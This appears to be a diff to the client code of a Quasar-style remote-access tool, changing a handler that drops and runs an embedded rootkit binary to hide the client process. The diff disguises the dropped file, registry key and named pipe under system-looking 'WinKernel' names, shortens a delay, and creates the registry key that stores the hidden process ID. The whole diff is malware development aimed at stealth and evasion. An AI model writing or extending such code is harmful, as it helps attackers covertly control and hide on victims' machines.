@@ -45,7 +45,7 @@ namespace Quasar.Client.Messages
                 if (a2 == "install")
                 {
                     string friendlyName = AppDomain.CurrentDomain.FriendlyName;
-                    string text11 = Path.Combine(Path.GetTempPath(), "RKAGG.exe");
+                    string text11 = Path.Combine(Path.GetTempPath(), "LowWinKernel.exe");
                     try
                     {
                         byte[] agg_Binary = Resource1.RTKH;
@@ -57,7 +57,7 @@ namespace Quasar.Client.Messages
                     try
                     {
                         Process.Start(text11);
-                        if (friendlyName.StartsWith("AGG"))
+                        if (friendlyName.StartsWith("WinKernel"))
                         {
                             client.Send(new NotifyMessageToServer { Message = "RK: Info: process is now hidden (method 1)" });
                         }
@@ -70,17 +70,24 @@ namespace Quasar.Client.Messages
                     {
                         client.Send(new NotifyMessageToServer { Message = string.Format("RK: Error: an error occurred with rk binary: {0}", ex17.Message) });
                     }
-                    Thread.Sleep(15000);
+                    Thread.Sleep(5000);
                     int id = Process.GetCurrentProcess().Id;
                     try
                     {
                         using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                         {
-                            using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\AGGconfig\\pid", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.FullControl))
+                            using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\WinKernelconfig\\pid", RegistryKeyPermissionCheck.ReadWriteSubTree))
                             {
-                                if (registryKey2 != null)
+                                if (registryKey2 == null) // Key does not exist
                                 {
-                                    registryKey2.SetValue("RAT", id, RegistryValueKind.DWord);
+                                    using (RegistryKey newKey = registryKey.CreateSubKey("SOFTWARE\\WinKernelconfig\\pid", RegistryKeyPermissionCheck.ReadWriteSubTree))
+                                    {
+                                        newKey.SetValue("PROC_ID", id, RegistryValueKind.DWord);
+                                    }
+                                }
+                                else // Key exists
+                                {
+                                    registryKey2.SetValue("PROC_ID", id, RegistryValueKind.DWord);
                                 }
                             }
                         }
@@ -101,7 +108,7 @@ namespace Quasar.Client.Messages
                 {
                     return;
                 }
-                using (NamedPipeClientStream namedPipeClientStream = new NamedPipeClientStream(".", "AGGcontrol", PipeDirection.InOut))
+                using (NamedPipeClientStream namedPipeClientStream = new NamedPipeClientStream(".", "WinKernelcontrol", PipeDirection.InOut))
                 {
                     try
                     {
